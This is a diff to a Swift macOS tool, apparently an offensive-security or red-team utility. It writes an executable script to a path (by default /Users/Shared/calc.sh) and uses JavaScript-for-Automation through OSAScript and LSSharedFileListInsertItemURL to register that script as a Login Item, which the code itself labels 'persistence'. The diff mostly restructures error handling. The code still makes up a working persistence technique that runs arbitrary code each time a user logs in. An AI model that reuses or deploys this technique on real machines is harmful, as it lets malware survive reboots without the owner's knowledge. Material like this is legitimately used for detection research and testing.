@@ -31,23 +31,24 @@ if commandOrPath == "/Users/Shared/calc.sh" {
         }
     }
 
-    // Create the file
+    let scriptData = Data(script.utf8)
+    fileMan.createFile(atPath: commandOrPath, contents: scriptData, attributes: nil)
+
+    var attributes = [FileAttributeKey: Any]()
+    attributes[.posixPermissions] = 0o755
     do {
-        let scriptData = Data(script.utf8)
-        try fileMan.createFile(atPath: commandOrPath, contents: scriptData, attributes: nil)
-        var attributes = [FileAttributeKey: Any]()
-        attributes[.posixPermissions] = 0o755
         try fileMan.setAttributes(attributes, ofItemAtPath: commandOrPath)
         print("[+] Successfully created file at: \(commandOrPath)")
     } catch {
-        print("[-] Failed to create file at: \(commandOrPath). Error: \(error)")
+        print("[-] Failed to set file attributes for: \(commandOrPath). Error: \(error)")
     }
 }
 
 // Always add to login items first
 print(" ===> Attempting to create Login Item persistence")
-do {
-    let jxa = """
+
+let jxa = """
+(function() {
     ObjC.import('CoreServices');
     ObjC.import('Security');
     ObjC.import('SystemConfiguration');
@@ -55,16 +56,16 @@ do {
     let items = $.LSSharedFileListCreate($.kCFAllocatorDefault, $.kLSSharedFileListSessionLoginItems, $.nil);
     let cfName = $.CFStringCreateWithCString($.nil, "\(commandOrPath)", $.kCFStringEncodingASCII);
     let itemRef = $.LSSharedFileListInsertItemURL(items, $.kLSSharedFileListItemLast, cfName, $.nil, temp, $.nil, $.nil);
-    console.log("[+] \(commandOrPath) successfully added as a Login Item");
-    """
+    return "[+] \(commandOrPath) successfully added as a Login Item";
+})();
+"""
 
-    let script = OSAScript.init(source: jxa, language: OSALanguage.init(forName: "JavaScript"))
-    var compileErr : NSDictionary?
-    script.executeAndReturnError(&compileErr)
-    var scriptErr : NSDictionary?
-    script.executeAndReturnError(&scriptErr)
+let script = OSAScript.init(source: jxa, language: OSALanguage.init(forName: "JavaScript"))
+var scriptErr: NSDictionary?
+let result = script.executeAndReturnError(&scriptErr)
 
-    print("[+] \(commandOrPath) successfully added as a Login Item")
-} catch let error {
-    print("[-] Error: \(error)")
+if let scriptError = scriptErr {
+    print("[-] Script Execution Error: \(scriptError)")
+} else {
+    print(result?.stringValue ?? "[+] \(commandOrPath) successfully added as a Login Item")
 }
